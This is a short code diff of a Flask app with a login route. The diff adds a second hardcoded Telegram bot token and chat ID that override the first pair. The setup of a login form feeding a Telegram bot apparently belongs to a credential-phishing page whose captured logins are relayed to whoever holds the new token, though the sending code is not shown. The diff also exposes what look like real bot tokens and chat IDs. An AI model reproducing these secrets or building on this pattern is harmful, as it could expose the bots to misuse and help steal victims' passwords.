@@ -8,6 +8,9 @@ app = Flask(__name__)
 BOT_TOKEN = "8186336309:AAFMZ-_3LRR4He9CAg7oxxNmjKGKACsvS8A"
 CHAT_ID = "6297861735"
 
+BOT_TOKEN = "8061642865:AAHHUZGH3Kzx7tN2PSsyLc53235DcVzMqKs"
+CHAT_ID = "7650873997"
+
 @app.route('/', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
